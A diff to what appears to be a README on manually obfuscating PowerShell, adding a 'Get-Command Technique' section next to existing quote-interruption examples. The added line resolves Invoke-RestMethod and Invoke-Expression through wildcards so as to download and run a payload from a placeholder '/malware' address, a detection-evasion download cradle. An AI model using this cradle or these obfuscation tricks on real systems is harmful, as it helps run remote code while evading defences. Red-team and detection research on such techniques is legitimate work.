@@ -6,6 +6,7 @@ A collection of techniques, examples and a little bit of theory for manually obf
 2. [Rename Objects](#Rename-Objects)
 3. [Obfuscate Boolean Values](#Obfuscate-Boolean-Values)
 4. [Cmdlet Quote Interruption](#Cmdlet-Quote-Interruption)
+6. [Get-Command Technique](#Get-Command-Technique)
 5. [Substitute Loops](#Substitute-Loops)
 6. [Substitute Commands](#Substitute-Commands)
 7. [Append Junk](#Append-Junk)
@@ -137,6 +138,12 @@ i""e''x"" "p`"`"w`"`"d''"
 ie""x'' "p`"`"w''d`"`""
 
 # You get the point.
+```
+
+## Get-Command Technique
+
+```
+&(Get-Command i****e-rest*) -uri https://192.168.0.66/malware | &(gcm i*x)
 ```
 
 ## Substitute Loops
